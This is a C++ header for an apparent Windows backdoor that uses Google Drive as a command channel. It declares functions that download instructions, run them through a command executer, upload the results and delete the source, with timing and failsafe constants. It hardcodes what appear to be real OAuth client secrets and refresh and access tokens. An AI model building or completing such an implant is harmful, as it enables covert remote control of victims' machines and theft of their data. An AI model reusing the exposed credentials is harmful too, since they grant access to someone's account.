#pragma once

#include <string>
#include <windows.h>
#include <spdlog/spdlog.h>

// Status code definitions
#define BDRIVE_OK 200
#define BDRIVE_NO_CONTENT 204
#define BDRIVE_REFRESH_NOT_ACCEPTABLE 406
#define BDRIVE_TIMED_OUT 600
#define BDRIVE_NO_INTERNET 601
#define BDRIVE_INVALID_ACCESS_TOKEN 401
#define BDRIVE_INVALID_REFRESH_TOKEN 699

// State machine definitions
#define STATE_INIT 0b11111111
#define STATE_DOWNLOADING 0b00
#define STATE_EXECUTING 0b01
#define STATE_UPLOADING 0b10
#define STATE_DELETING 0b11
#define STATE_ACCESS_TOKEN_LOST 0b100
#define STATE_REFRESH_TOKEN_LOST 0b101
#define STATE_CONNECTION_LOST 0b1000

// Configuration constants
#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
#define FAILSAFE_THRESHOLD 2402 * 1000
#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define SOURCE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
#define MAX_UPLOAD_SIZE 4608 // 4.5 * 1024
#define CLIPBOARD "41594159"
#define CLIENT_SECRET "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"
#define CLIENT_ID "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com"
#define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"
#define INIT_REFRESH_TOKEN "1//03263N6jS7d6TCgYIARAAGAMSNwF-L9Irn4u11nS_Q6Btl1S88WilfGjVcnakac_1YDB3chyZw8caf2ppdejE5nOI5ixhAaIlKaw"
#define INIT_ACCESS_TOKEN "ya29.a0AW4XtxhDsQVZR1dSsbv9t7pKQWALBg5B0JFZM8EE4bXUQywxoceYQV28yBrMJ55vH4sZWb6x0v1Y58p0JWj-Z9AFHLcLZp4MzqFizex6CE00qkl9XIC7ff8rYPw8stNkciy_K3sXe-lvt1Nxg8uhdz61jes1-voXKhLSQ80ZaCgYKAfwSARASFQHGX2MioUkPjE-OFemftCbVt19THQ0175"
#define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5

DWORD expo(DWORD base, DWORD exponent);

WORD downloadSourceContext(std::string accessToken, std::string& output);

WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD& subIndex);

WORD deleteSource(std::string accessToken);

WORD commandExecuter(std::string input, std::string& output);

WORD setNewAccessToken(std::string& accessToken, std::string refreshToken);

WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken);

WORD checkConnection();